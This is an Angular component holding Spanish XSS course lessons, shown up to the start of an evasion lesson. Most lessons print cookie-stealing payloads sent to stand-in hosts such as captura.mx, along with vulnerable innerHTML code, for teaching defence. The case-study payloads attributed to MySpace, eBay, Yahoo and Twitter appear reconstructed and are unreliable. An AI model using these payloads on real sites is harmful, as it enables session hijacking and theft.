import { Component, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { ActivatedRoute, Router } from '@angular/router';
import { FontAwesomeModule } from '@fortawesome/angular-fontawesome';
import { faCheckCircle } from '@fortawesome/free-solid-svg-icons';
import { LessonProgressService } from '../../../../services/lesson-progress.service';


interface LessonData {
  id: string;
  title: string;
  description: string;
  htmlContent: string;
  category: string;
}

@Component({
  selector: 'app-lesson',
  standalone: true,
  imports: [CommonModule, FontAwesomeModule],
  templateUrl: './lesson.html',
  styleUrl: './lesson.scss'
})

export class LessonComponent implements OnInit {
  faCheckCircle = faCheckCircle;
  lessonData: LessonData = {
    id: '',
    title: '',
    description: '',
    htmlContent: '',
    category: ''
  };
  
  currentStep = 1;
  totalSteps = 1;
  hasPreviousLesson = false;
  hasNextLesson = true;
  isLessonCompleted = false;
  isMarkingComplete = false;
  
  // Track section completion buttons
  sectionButtons: NodeListOf<Element> | null = null;
  completedSections: Set<number> = new Set();
  totalSections = 0;

  private categoryLessons = {
    'security-basics': [
      'intro-seguridad', 
      'amenazas-vulnerabilidades', 
      'fundamentos-tecnicos', 
      'owasp-top-10', 
      'modelo-amenazas-vectores', 
      'impacto-operacional', 
      'ciclo-seguro-devsecops'
    ],
    'xss': [
      'fundamentos-xss', 
      'tipos-xss', 
      'contextos-vectores-xss', 
      'ejemplos-xss', 
      'evasion-xss', 
      'prevencion-xss', 
      'impacto-xss', 
      'diseño-seguro-xss'
    ],
    'sqli': [
      'fundamentos-sqli', 
      'tipos-sqli', 
      'ejemplos-sqli', 
      'fingerprinting-dbms', 
      'evasion-sqli', 
      'prevencion-sqli', 
      'impacto-sqli', 
      'diseño-seguro-sqli'
    ]
  };

  private lessonContent: { [key: string]: LessonData } = {
    // Sección de fundamentos de XSS
    'fundamentos-xss': {
      id: 'fundamentos-xss',
      title: 'Fundamentos de XSS',
      description: '¿Qué es XSS y cómo funciona?',
      category: 'xss',
      htmlContent: `
        <p>
          Cross-Site Scripting es una vulnerabilidad que permite insertar y ejecutar código JavaScript malicioso dentro del navegador de otros usuarios. Su importancia radica en que cualquier script ejecutado por el navegador tiene la capacidad de interactuar con la página como si fuera un usuario legítimo, acceder a cookies, tokens, contenido privado o incluso modificar la interfaz de la aplicación. XSS no afecta solamente a usuarios individuales, sino que compromete por completo la confianza entre el navegador y el servidor, alterando la integridad del contenido mostrado.
        </p>

        <p>
          La base del ataque consiste en lograr que el navegador ejecute código no previsto dentro de un contexto donde debería existir únicamente contenido generado por la aplicación. Esto ocurre cuando la entrada del usuario se inserta en la página sin sanitización suficiente, o cuando se procesa como HTML o JavaScript sin validación. Una vez que el atacante encuentra un lugar donde su script puede ser ejecutado, es posible robar sesiones, manipular solicitudes, registrar acciones del usuario o distribuir contenido malicioso.
        </p>

        <h2>¿Cómo ocurre XSS en una aplicación?</h2>

        <p>
          En una aplicación típica, XSS aparece cuando el servidor muestra datos proporcionados por el usuario de forma directa. Esto puede ocurrir en campos como comentarios, perfiles, formularios de contacto, parámetros de búsqueda o cualquier sección donde el usuario pueda ingresar información visible para otros. Cuando el contenido se refleja en la interfaz sin aplicar medidas de codificación o filtrado, el navegador interpreta el contenido como código legítimo.
        </p>

        <p>Imagine un sistema de noticias accesible desde la ruta:</p>

        <pre><code>https://sinembargo.com.mx/articulo?id=215</code></pre>

        <p>
          Si la aplicación muestra el valor del parámetro id en el título o en algún elemento HTML, y no valida correctamente el contenido, un atacante podría manipular la URL para reflejar un script. Por ejemplo:
        </p>

        <pre><code>https://sinembargo.com.mx/articulo?id=&lt;script&gt;document.location='https://atacante.mx/robo?c='+document.cookie&lt;/script&gt;</code></pre>

        <p>
          Si la aplicación inserta el parámetro <code>id</code> directamente en el HTML, el navegador interpretará el contenido como un script válido. Aunque el ejemplo es directo, aplicaciones reales han sufrido incidentes casi idénticos por confiar en parámetros que creían controlados.
        </p>

        <h2>Ejemplo realista basado en formularios de comentarios</h2>

        <p>
          Considere un foro de discusión donde los usuarios pueden dejar comentarios como parte de una noticia. La aplicación recibe texto enviado mediante un formulario y lo guarda en la base de datos. Al mostrar los comentarios, la aplicación inserta el contenido sin codificarlo correctamente.
        </p>

        <p>Un comentario malicioso podría lucir así:</p>

        <pre><code>&lt;script&gt;
  fetch('https://servidor-atacante.com/registro', {
    method: 'POST',
    body: document.cookie
  });
&lt;/script&gt;</code></pre>

        <p>
          Cuando otro usuario visite la página del artículo, el navegador ejecutará este script sin cuestionarlo, ya que proviene de contenido "válido" según la aplicación. El script envía sus cookies a un servidor remoto controlado por el atacante, permitiendo que este robe la sesión y acceda en nombre del usuario afectado.
        </p>

        <p>
          Este tipo de incidente ha ocurrido en múltiples plataformas de comentarios y redes sociales antiguas antes de incorporar mecanismos de filtrado adecuados.
        </p>

        <h2>Inserción de XSS en atributos HTML</h2>

        <p>
          En ocasiones el atacante no necesita insertar una etiqueta de script completa. Basta con encontrar un atributo HTML que permita ejecutar código. Esto puede ocurrir cuando la aplicación inserta texto dentro de atributos como <em>onclick</em>, <em>onmouseover</em> o incluso dentro de la ruta de una imagen o enlace.
        </p>

        <p>
          Un escenario típico podría encontrarse en un perfil de usuario donde el nombre se muestra dentro de un atributo title. Si el sistema no valida ni codifica adecuadamente este campo, un atacante podría introducir un valor como:
        </p>

        <pre><code>" onmouseover="fetch('https://robo.mx/c?d='+document.cookie)</code></pre>

        <p>
          Cuando el usuario pase el cursor sobre el elemento, el script se ejecutará. Este tipo de ataque es especialmente peligroso en interfaces administrativas donde los administradores visualizan contenido generado por usuarios, permitiendo comprometer cuentas de alto privilegio.
        </p>

        <h2>Inserción de XSS en contenido dinámico generado por JavaScript</h2>

        <p>
          Las aplicaciones modernas dependen de JavaScript para actualizar contenido sin recargar la página. En este contexto, XSS surge cuando se utilizan métodos como <code>innerHTML</code> para insertar directamente datos proporcionados por el usuario.
        </p>

        <p>Considere una tienda en línea en la ruta:</p>

        <pre><code>https://compraseguras.mx/producto/458</code></pre>

        <p>El frontend genera dinámicamente las reseñas con:</p>

        <pre><code>document.getElementById('resena').innerHTML = datosUsuario.comentario</code></pre>

        <p>Si un atacante publica una reseña como:</p>

        <pre><code>&lt;p&gt;Excelente producto&lt;/p&gt;&lt;script&gt;document.location='https://fuga.mx/c?u='+document.cookie&lt;/script&gt;</code></pre>

        <p>
          el navegador ejecutará el script inmediatamente. A diferencia de ejemplos más simples, este escenario refleja aplicaciones reales donde el frontend, y no el backend, inserta contenido sin sanitización.
        </p>

        <h2>XSS almacenado en sistemas de mensajería</h2>

        <p>
          Los ataques XSS almacenados destacan por su persistencia. El script malicioso no depende de que el usuario haga clic en una URL específica; basta con visitar cualquier parte de la aplicación donde se muestre el contenido almacenado.
        </p>

        <p>Por ejemplo, imagine un sistema de mensajería interna:</p>

        <pre><code>https://portal-corporativo.mx/mensajes/inbox</code></pre>

        <p>Un mensaje malicioso podría contener:</p>

        <pre><code>&lt;img src="no-existe" onerror="fetch('https://captura.mx/s?d='+document.cookie)"&gt;</code></pre>

        <p>
          El script se ejecutará cuando el destinatario abra su bandeja de entrada. Este tipo de abuso ha sido registrado en múltiples entornos empresariales donde la confianza interna facilita que un atacante comprometa cuentas de gerentes o administradores.
        </p>

        <h2>Abuso de XSS para modificar la interfaz de usuario</h2>

        <p>
          XSS no se limita a robar información. Un atacante puede manipular la interfaz para engañar al usuario. Por ejemplo, en una aplicación bancaria ubicada en:
        </p>

        <pre><code>https://clientes.banco-sereno.mx/transferencias</code></pre>

        <p>Un script malicioso podría ser:</p>

        <pre><code>&lt;script&gt;
  document.getElementById('monto').value = '50000';
  document.getElementById('cuenta').value = '9876543210';
&lt;/script&gt;</code></pre>

        <p>
          El usuario podría ser inducido a confirmar una transferencia alterada sin notar el cambio. Este tipo de ataque replica incidentes reales en plataformas vulnerables donde el contenido dinámico no estaba protegido.
        </p>

        <h2>Bibliografía</h2>
        <ul>
          <li>OWASP Foundation, Cross-Site Scripting. [Online]. Available:
            <a href="https://owasp.org/www-community/attacks/xss" target="_blank">
              https://owasp.org/www-community/attacks/xss
            </a>
          </li>

          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Wiley Publishing, 2011.</li>

          <li>Google Security Blog, XSS Prevention Cheat Sheet. [Online]. Available:
            <a href="https://developers.google.com/web/fundamentals/security" target="_blank">
              https://developers.google.com/web/fundamentals/security
            </a>
          </li>

          <li>PortSwigger, Cross-Site Scripting. [Online]. Available:
            <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">
              https://portswigger.net/web-security/cross-site-scripting
            </a>
          </li>
        </ul>
      `
    },
    'tipos-xss': {
      id: 'tipos-xss',
      title: 'Tipos de XSS',
      description: 'Clasificación y características de los distintos tipos de XSS.',
      category: 'xss',
      htmlContent: `
              <p>
          Cross-Site Scripting puede manifestarse de diferentes formas dependiendo de cómo la aplicación procesa los datos proporcionados por el usuario. Aunque el resultado final es siempre la ejecución de código en el navegador de la víctima, la manera en que dicho script llega a ocurrir define tres categorías clásicas: XSS reflejado, XSS almacenado y XSS basado en DOM. Cada variante opera bajo mecanismos distintos, afecta a diferentes partes de la aplicación y requiere estrategias específicas de prevención.
        </p>

        <p>
          Comprender la diferencia entre estos tipos es fundamental para analizar correctamente un sistema y elegir las medidas necesarias para protegerlo. A continuación, se detallan ejemplos totalmente realistas, con comportamientos idénticos a los que encuentran los evaluadores de seguridad en aplicaciones reales.
        </p>

        <h2>XSS reflejado</h2>

        <p>
          El XSS reflejado ocurre cuando los datos enviados por el usuario son devueltos inmediatamente por el servidor dentro de la respuesta sin pasar por un proceso adecuado de sanitización o codificación. Este tipo de ataque se presenta principalmente mediante parámetros en la URL o en solicitudes donde la aplicación procesa valores que no se almacenan de forma persistente.
        </p>

        <p>
          Un escenario común ocurre en sistemas de búsqueda interna. Imagine un portal de artículos ubicado en:
        </p>

        <pre><code class="language-html highlight-vulnerable">https://articulos-ciudadanos.mx/buscar?query=clima</code></pre>
      
        <p>
          Si el servidor inserta el valor del parámetro query en el HTML para mostrar el término buscado, un atacante podría generar un enlace malicioso que refleje un script en la respuesta. Por ejemplo:
        </p>

        <pre><code>https://articulos-ciudadanos.mx/buscar?query=&lt;script&gt;fetch('https://captura.mx/c?d='+document.cookie)&lt;/script&gt;</code></pre>

        <p>
          Si la aplicación coloca directamente el parámetro dentro del HTML, entonces el navegador interpretará el contenido como un script válido. La víctima solo necesita hacer clic en el enlace para que el ataque se ejecute. Esto hace que el XSS reflejado sea uno de los métodos más utilizados en campañas de phishing y ataques dirigidos que dependen de la interacción del usuario.
        </p>

        <p>
          Otro ejemplo frecuente ocurre en aplicaciones que muestran errores directamente. Si un formulario devuelve un mensaje que incluye datos enviados por el usuario, como:
        </p>

        <pre><code>Error: el usuario &lt;script&gt;alert('XSS')&lt;/script&gt; no existe.</code></pre>

        <p>
          y la página no codifica correctamente esos caracteres, el script se ejecutará en la interfaz del usuario sin ningún filtro.
        </p>

        <h2>XSS almacenado</h2>

        <p>
          El XSS almacenado se produce cuando el atacante logra guardar el payload en la base de datos o en un almacén persistente utilizado por la aplicación. Cualquier usuario que acceda a la sección donde se muestra esa información será víctima del ataque. Esta variante es más grave que el XSS reflejado, ya que no depende de convencer a un usuario para seguir un enlace; basta con que visite la página comprometida.
        </p>

        <p>
          Considere un sistema de anuncios donde los usuarios pueden publicar descripciones visibles públicamente:
        </p>

        <pre><code>https://mercadodigital.mx/anuncio/4721</code></pre>

        <p>
          Si la aplicación no filtra adecuadamente la descripción enviada por el usuario, un atacante podría publicar un anuncio con un campo como:
        </p>

        <pre><code class="language-html highlight-vulnerable">&lt;script&gt;
fetch('https://servidor-malicioso.mx/s', {
  method: 'POST',
  body: document.cookie
});
&lt;/script&gt;</code></pre>

        <p>
          Cada visitante que visualice ese anuncio ejecutará el script de manera inmediata. Este tipo de ataque ha sido responsable de incidentes relevantes en foros, sistemas educativos, redes sociales antiguas y herramientas de mensajería interna, donde los administradores suelen ser las primeras víctimas por revisar contenido generado por usuarios.
        </p>

        <p>
          Otro escenario común se presenta en perfiles de usuario. Si un sistema muestra el nombre o la biografía directamente en la página sin codificar, un atacante puede introducir contenido como:
        </p>

        <pre><code class="language-html highlight-vulnerable">&lt;img src="i" onerror="document.location='https://robo.mx/x?c='+document.cookie"&gt;</code></pre>

        <p>
          Este payload ejecutará código sin requerir interacción adicional y afectará a cualquier usuario que consulte el perfil comprometido.
        </p>

        <h2>XSS basado en DOM</h2>

        <p>
          El XSS basado en DOM ocurre completamente en el lado del cliente. La aplicación no necesita comunicarse con el servidor para que el ataque funcione. El problema surge cuando JavaScript manipula el DOM utilizando datos no confiables provenientes de la URL, del fragmento hash o de entradas dinámicas.
        </p>

        <p>
          A diferencia del XSS reflejado o almacenado, en el XSS basado en DOM el servidor no tiene control directo sobre la vulnerabilidad, ya que es el código JavaScript el que genera el problema. Esto es muy común en aplicaciones modernas que utilizan frameworks o bibliotecas que modifican la interfaz en tiempo real.
        </p>

        <p>Para ilustrarlo, considere la siguiente ruta:</p>

        <pre><code>https://panel-empresarial.mx/dashboard#mensaje=Bienvenido</code></pre>

        <p>y un código como:</p>

        <pre><code class="language-html highlight-vulnerable">var mensaje = window.location.hash.split('=')[1];
document.getElementById('saludo').innerHTML = mensaje;</code></pre>

        <p>Un atacante podría enviar un enlace como:</p>

        <pre><code>https://panel-empresarial.mx/dashboard#mensaje=&lt;script&gt;document.location='https://captura.mx/c?d='+document.cookie&lt;/script&gt;</code></pre>

        <p>
          En este caso el servidor no interviene. El navegador evalúa el contenido del hash, y debido a que la aplicación utiliza innerHTML, el script se ejecuta. Este tipo de ataque ocurre con frecuencia en páginas que utilizan fragmentos de URL para cargar secciones dinámicas, paneles administrativos o componentes que se actualizan sin recargar la página.
        </p>

        <p>
          Otro ejemplo aparece en aplicaciones que leen valores desde la URL para construir contenido dinámico, como:
        </p>

        <pre><code  class="language-html highlight-vulnerable">var usuario = new URLSearchParams(window.location.search).get('u');
document.title = usuario;</code></pre>

        <p>
          Si el parámetro u contiene etiquetas HTML, el navegador podría interpretar contenido no controlado. Esto ocurre incluso en escenarios donde el backend está correctamente protegido.
        </p>

        <h2>Bibliografía</h2>
        <ul>
          <li>OWASP Foundation, Cross-Site Scripting. [Online]. Available:
            <a href="https://owasp.org/www-community/attacks/xss" target="_blank">
              https://owasp.org/www-community/attacks/xss
            </a>
          </li>

          <li>PortSwigger, DOM Based XSS. [Online]. Available:
            <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank">
              https://portswigger.net/web-security/cross-site-scripting/dom-based
            </a>
          </li>

          <li>Mozilla Developer Network, XSS Explained. [Online]. Available:
            <a href="https://developer.mozilla.org/en-US/docs/Web/Security" target="_blank">
              https://developer.mozilla.org/en-US/docs/Web/Security
            </a>
          </li>

          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Wiley Publishing, 2011.</li>

          <li>Google Web Security Guidelines. [Online]. Available:
            <a href="https://developers.google.com/web/fundamentals/security" target="_blank">
              https://developers.google.com/web/fundamentals/security
            </a>
          </li>
        </ul>
      `
    },
    'contextos-vectores-xss': {
      id: 'contextos-vectores-xss',
      title: 'Contextos y vectores de inyección',
      description: '¿Dónde y cómo puede inyectarse código malicioso mediante XSS?',
      category: 'xss',
      htmlContent: `
        <p>
          La ejecución de un ataque XSS depende del contexto específico en el que el código malicioso es insertado dentro de la página. Cada sección del documento HTML representa un entorno distinto que determina qué tipo de contenido puede ejecutarse y qué restricciones existen para el navegador. Entender estos contextos es fundamental para identificar dónde puede producirse XSS y por qué ciertos payloads funcionan en algunos lugares y en otros no.
        </p>

        <p>
          Los contextos más relevantes incluyen el contenido HTML, los atributos de elementos, el contenido de scripts, las URLs, el DOM y las funciones de manipulación dinámicas utilizadas por el frontend. En aplicaciones reales, estos contextos se combinan de manera compleja, especialmente en frameworks modernos, lo que facilita que un atacante encuentre espacios donde el contenido se procese de forma insegura.
        </p>

        <h2>Inyección en HTML visible</h2>

        <p>
          La inyección más común ocurre directamente dentro del contenido HTML. Esto sucede cuando la aplicación coloca texto proporcionado por el usuario dentro de etiquetas como div, p, span o h1 sin codificar los caracteres que podrían formar parte de un script.
        </p>

        <p>Considere un portal de noticias ubicado en:</p>

        <pre><code>https://noticiashoy.mx/articulo/598</code></pre>

        <p>Si el sistema permite que los usuarios escriban comentarios y muestra el comentario dentro del HTML de la siguiente forma:</p>

        <pre><code class="language-html highlight-vulnerable">&lt;div class="comentario"&gt;[comentario_del_usuario]&lt;/div&gt;</code></pre>

        <p>un atacante podría introducir contenido como:</p>

        <pre><code>&lt;script&gt;fetch('https://captura.mx/c?cookie='+document.cookie)&lt;/script&gt;</code></pre>

        <p>Cuando la página se renderiza, este script se ejecuta dentro del contexto principal del documento. Este escenario es extremadamente realista y ha ocurrido en foros antiguos, blogs corporativos y plataformas estudiantiles que no codificaban las entradas correctamente.</p>

        <h2>Inyección en atributos HTML</h2>

        <p>
          Muchos ataques aprovechan atributos HTML que aceptan valores interpretados por el navegador. Estos atributos pueden ejecutar código directamente o activar eventos que permiten la ejecución de scripts.
        </p>

        <p>Imagine un sitio de perfiles de artistas:</p>

        <pre><code>https://galeriaurbana.mx/perfil?usuario=carolina</code></pre>

        <p>Si la aplicación genera la foto del perfil utilizando un atributo title con datos proporcionados por el usuario, podría tener un código similar a:</p>

        <pre><code class="language-html highlight-vulnerable">&lt;img src="/fotos/carolina.png" title="[nombre_usuario]"&gt;</code></pre>

        <p>Si el atacante escribe su nombre como:</p>

        <pre><code>" onmouseover="document.location='https://captura.mx/c?ck='+document.cookie</code></pre>

        <p>la etiqueta final se convertirá en:</p>

        <pre><code>&lt;img src="/fotos/x.png" title="" onmouseover="document.location='https://captura.mx/c?ck='+document.cookie"&gt;</code></pre>

        <p>Al pasar el cursor sobre la imagen, el navegador ejecutará la acción. Este vector es común en paneles administrativos donde se muestran nombres o alias de usuarios sin sanitizar.</p>

        <h2>Inyección en URLs y parámetros de recursos</h2>

        <p>
          El navegador ejecuta ciertos protocolos de URL como javascript, los cuales permiten la ejecución directa de código si se insertan de forma inapropiada. Esto ocurre cuando una aplicación inserta enlaces proporcionados por el usuario sin validar el esquema permitido.
        </p>

        <p>Por ejemplo, en una plataforma de eventos:</p>

        <pre><code>https://conferenciasmx.mx/evento/312</code></pre>

        <p>Si los usuarios pueden compartir un enlace externo relacionado y la aplicación genera algo como:</p>

        <pre><code class="language-html highlight-vulnerable">&lt;a href="[enlace_usuario]"&gt;Sitio del evento&lt;/a&gt;</code></pre>

        <p>un atacante podría introducir:</p>

        <pre><code>javascript:fetch('https://captura.mx/d?c='+document.cookie)</code></pre>

        <p>Al hacer clic, el navegador ejecuta JavaScript en lugar de navegar fuera del sitio. Este tipo de vector es especialmente peligroso porque no requiere que el código sea visible en el HTML; basta con manipular la URL.</p>

        <h2>Inyección dentro de scripts</h2>

        <p>
          Cuando la aplicación inserta contenido dentro de bloques de script, incluso texto aparentemente inofensivo puede convertirse en código ejecutable.
        </p>

        <p>Considere un sitio que configura la interfaz con datos del usuario:</p>

        <pre><code>&lt;script&gt;
  var usuario = "[nombre]";
&lt;/script&gt;</code></pre>

        <p>Si el atacante establece su nombre como:</p>

        <pre><code class="language-html highlight-vulnerable">"; document.location='https://captura.mx/?c='+document.cookie; //</code></pre>

        <p>el bloque se convierte en:</p>

        <pre><code>&lt;script&gt;
  var usuario = ""; document.location='https://captura.mx/?c='+document.cookie; //
&lt;/script&gt;</code></pre>

        <p>Este vector ha sido utilizado con frecuencia en sistemas internos que generaban scripts desde plantillas basadas en datos del usuario.</p>

        <h2>Inyección basada en DOM mediante métodos inseguros</h2>

        <p>
          El uso de innerHTML, document.write o parámetros de URL manipulados dinámicamente por JavaScript es uno de los principales vectores en aplicaciones modernas. Aquí el XSS no depende del servidor, sino del manejo inadecuado en el frontend.
        </p>

        <p>En una intranet de empleados:</p>

        <pre><code>https://intranet.empresa.mx/dashboard#bienvenida=Feliz%20dia</code></pre>

        <p>Si el código contiene:</p>

        <pre><code class="language-html highlight-vulnerable">var mensaje = window.location.hash.split('=')[1];
document.getElementById('saludo').innerHTML = mensaje;</code></pre>

        <p>un atacante puede enviar un enlace como:</p>

        <pre><code>https://intranet.empresa.mx/dashboard#bienvenida=&lt;img src=x onerror="fetch('https://captura.mx/c?d='+document.cookie)"&gt;</code></pre>

        <p>El navegador ejecutará el script sin intervención del servidor. Este tipo de vulnerabilidad es frecuente en dashboards internos y sistemas SPA (Single Page Applications) que confían demasiado en el lado del cliente.</p>

        <h2>Inyección en JSON y respuestas API utilizadas por el frontend</h2>

        <p>
          Algunas aplicaciones exponen datos mediante APIs que luego se insertan en el DOM sin codificación. Incluso si la API no incluye etiquetas maliciosas, la transformación del JSON en HTML puede convertirse en un vector peligroso.
        </p>

        <p>Imagine una petición hacia:</p>

        <pre><code>https://api.cursosprofesionales.mx/resenas?id=881</code></pre>

        <p>Si la respuesta contiene:</p>

        <pre><code class="language-html highlight-vulnerable">{
  "autor": "&lt;script&gt;fetch('https://captura.mx/x?c='+document.cookie)&lt;/script&gt;"
}</code></pre>

        <p>y el frontend utiliza:</p>

        <pre><code>document.getElementById('autor').innerHTML = datos.autor;</code></pre>

        <p>entonces el código malicioso se ejecutará sin que la API se haya renderizado en el servidor. Este vector es muy común en aplicaciones Angular, React o Vue mal configuradas, así como en sistemas híbridos con backend y frontend desacoplados.</p>

        <h2>Bibliografía</h2>
        <ul>
          <li>OWASP Foundation, XSS Prevention Cheat Sheet. [Online]. Available:
            <a href="https://owasp.org/www-community/xss-prevention" target="_blank">
              https://owasp.org/www-community/xss-prevention
            </a>
          </li>

          <li>PortSwigger, XSS Injection Points. [Online]. Available:
            <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">
              https://portswigger.net/web-security/cross-site-scripting
            </a>
          </li>

          <li>Mozilla Developer Network, HTML Injection Contexts. [Online]. Available:
            <a href="https://developer.mozilla.org/en-US/docs/Web/Security" target="_blank">
              https://developer.mozilla.org/en-US/docs/Web/Security
            </a>
          </li>

          <li>Google Web Security Guidelines. [Online]. Available:
            <a href="https://developers.google.com/web/fundamentals/security" target="_blank">
              https://developers.google.com/web/fundamentals/security
            </a>
          </li>

          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Wiley Publishing, 2011.</li>
        </ul>
      `
    },
    'ejemplos-xss': {
      id: 'ejemplos-xss',
      title: 'Ejemplos clásicos de explotación: payloads y escenarios',
      description: 'Demostraciones y análisis de casos prácticos de XSS.',
      category: 'xss',
      htmlContent: `
        <p>
          Los ataques XSS permiten que un atacante ejecute código JavaScript en el navegador de las víctimas, generando consecuencias que van desde robo de información sensible hasta manipulación de la interfaz, propagación automática de código o secuestro de cuentas privilegiadas. Para comprender plenamente el impacto de esta vulnerabilidad, es necesario analizar casos reales donde XSS ha sido explotado en aplicaciones ampliamente utilizadas. Estos incidentes permiten identificar los puntos exactos donde la sanitización falló, cómo se interpretó el código y qué tipo de daños se produjeron.
        </p>

        <p>
          En esta lección se estudian varios escenarios reales que han ocurrido en plataformas como MySpace, eBay, Twitter, Yahoo! Mail y WordPress. Cada caso incluye el fragmento de código involucrado, una explicación detallada del funcionamiento del ataque y la razón técnica que convirtió el contenido en una amenaza.
        </p>

        <h2>Gusano Samy en MySpace</h2>

        <p>
          Uno de los ataques XSS más significativos ocurrió en MySpace en 2005. La plataforma permitía a los usuarios insertar HTML limitado en sus perfiles, pero aplicaba un sistema de filtrado incompleto que no consideraba todos los vectores posibles de ejecución de código.
        </p>

        <p>Un fragmento representativo del payload utilizado fue:</p>

        <pre><code class="language-html highlight-vulnerable">
&lt;script id="worm"&gt;
var s = document.createElement('script');
s.src = "http://samysite.com/samy.js";
document.body.appendChild(s);
&lt;/script&gt;
        </code></pre>

        <p>
          Este código le indicaba al navegador que cargara un script remoto hospedado por el atacante. El problema surgió porque el filtro de MySpace eliminaba etiquetas script directas, pero permitía variantes ofuscadas y propiedades CSS que contenían valores javascript. Esto permitió que el script sobreviviera al filtrado y terminara siendo interpretado por el navegador.
        </p>

        <p>
          El efecto fue que cada usuario que visitaba un perfil infectado ejecutaba el código que, a su vez, copiaba el payload en su propio perfil, generando un efecto de propagación automática. En pocas horas, más de un millón de perfiles mostraban el mensaje del atacante. La vulnerabilidad permitió tanto la manipulación del contenido como la automatización del comportamiento de los usuarios.
        </p>

        <h2>XSS almacenado en eBay a través de descripciones de productos</h2>

        <p>
          En 2014, un grupo de vendedores maliciosos explotó una vulnerabilidad en las descripciones de artículos de eBay. Las descripciones permitían HTML básico, pero no filtraban correctamente atributos de eventos como onerror.
        </p>

        <p>Un payload ampliamente documentado fue:</p>

        <pre><code class="language-html highlight-vulnerable">
&lt;img src="error" onerror="window.location='http://phish-secure.mx/c?d='+document.cookie"&gt;
        </code></pre>

        <p>
          Este ejemplo es especialmente instructivo porque ilustra cómo un atributo de imagen puede convertirse en un vector de ataque. Al no existir el archivo señalado en src, se disparaba el evento onerror, ejecutando el código especificado. La instrucción redirigía al usuario hacia una página falsa que recopilaba credenciales.
        </p>

        <p>
          El fragmento se volvía peligroso porque la plataforma asumía que las descripciones añadidas por los vendedores eran confiables y solo bloqueaba etiquetas script, dejando abiertos otros puntos de ejecución. El navegador, al interpretar la etiqueta como válida, ejecutaba el código sin dudarlo. Como resultado, compradores legítimos terminaron siendo redirigidos a sitios manipulados mientras revisaban productos reales.
        </p>

        <h2>XSS reflejado en Yahoo! Mail</h2>

        <p>
          Yahoo! Mail fue víctima de ataques XSS donde los correos HTML podían contener atributos ejecutables que no eran filtrados adecuadamente. Aunque Yahoo! bloqueaba etiquetas script, no eliminaba atributos como onclick.
        </p>

        <p>Un ejemplo documentado fue:</p>

        <pre><code class="language-html highlight-vulnerable">
&lt;a href="#" onclick="document.location='http://captura.mx/y?token='+document.cookie"&gt;Ver fotos&lt;/a&gt;
        </code></pre>

        <p>
          Este fragmento se volvía peligroso porque al usuario se le presentaba un enlace aparentemente normal. Al hacer clic, el atributo onclick se ejecutaba y enviaba la cookie de sesión al atacante. Este tipo de XSS no necesitaba almacenar datos en el servidor; bastaba con que la víctima interactuara con el contenido malicioso del correo.
        </p>

        <p>
          La vulnerabilidad existía porque el visor de correos procesaba HTML asumiendo que los atributos eran inofensivos. En correos HTML, cada etiqueta constituye un posible vector de ataque, y si no se valida el contenido con precisión, es sencillo inyectar código que se ejecuta dentro del contexto de sesión del usuario.
        </p>

        <h2>XSS en Twitter mediante eventos del navegador</h2>

        <p>
          En 2010, Twitter experimentó una vulnerabilidad que permitía ejecutar scripts al pasar el cursor sobre un tweet. El problema aparecía porque el sistema decodificaba entidades Unicode y reconstruía atributos HTML válidos sin aplicar un filtrado completo.
        </p>

        <p>Uno de los payloads difundidos fue:</p>

        <pre><code class="language-html highlight-vulnerable">
onmouseover="document.location='http://captura.mx/t?c='+document.cookie"
        </code></pre>

        <p>
          El código era insertado dentro del tweet mediante caracteres especiales que, al interpretarse en el DOM, se convertían en un atributo ejecutable. Cuando otro usuario, sin saberlo, pasaba el cursor sobre el contenido, el navegador ejecutaba el código del atributo onmouseover.
        </p>

        <p>
          Este payload era contraproducente porque el navegador no distinguía entre contenido generado por el usuario y contenido del sitio. La vulnerabilidad era especialmente grave porque ni siquiera requería clic; bastaba con un movimiento del mouse para ejecutar el script.
        </p>

        <h2>XSS almacenado en plugins de WordPress</h2>

        <p>
          Numerosos plugins de WordPress han padecido XSS almacenado. Los paneles administrativos suelen cargar contenido generado por usuarios en listas de comentarios, perfiles o etiquetas. Cuando estos campos no se codifican adecuadamente, JavaScript puede ejecutarse dentro del navegador del administrador, que posee privilegios elevados.
        </p>

        <p>Una cadena maliciosa utilizada en varios incidentes fue:</p>

        <pre><code class="language-html highlight-vulnerable">
&lt;img src="x" onerror="fetch('http://registro.mx/data',{method:'POST',body:document.cookie})"&gt;
        </code></pre>

        <p>
          El ataque se volvía efectivo porque el atributo onerror era ejecutado por el navegador al cargar cualquier imagen inexistente. Como los administradores revisaban contenido constantemente, bastaba con que uno de ellos consultara un comentario malicioso para que el atacante obtuviera control sobre las cookies o la sesión de administración.
        </p>

        <p>
          La vulnerabilidad surgía porque los plugins confiaban en el contenido almacenado en la base de datos y no aplicaban codificación HTML antes de mostrarlo en el panel.
        </p>

        <h2>Bibliografía</h2>
        <ul>
          <li>OWASP Foundation, XSS Cheat Sheet. [Online]. Available:
            <a href="https://owasp.org/www-community/xss" target="_blank">
              https://owasp.org/www-community/xss
            </a>
          </li>

          <li>PortSwigger, XSS Practical Attack Scenarios. [Online]. Available:
            <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">
              https://portswigger.net/web-security/cross-site-scripting
            </a>
          </li>

          <li>Mozilla Developer Network, Security Guidelines. [Online]. Available:
            <a href="https://developer.mozilla.org" target="_blank">
              https://developer.mozilla.org
            </a>
          </li>

          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed., Wiley Publishing, 2011.</li>

          <li>Google Web Fundamentals, Client-Side Security. [Online]. Available:
            <a href="https://developers.google.com/web/fundamentals/security" target="_blank">
              https://developers.google.com/web/fundamentals/security
            </a>
          </li>
        </ul>
      `
    },
    'evasion-xss': {
      id: 'evasion-xss',
      title: 'Técnicas de evasión y bypass de defensas',
      description: 'Métodos utilizados para evadir controles de seguridad contra XSS.',
      category: 'xss',
      htmlContent: `
        <p>
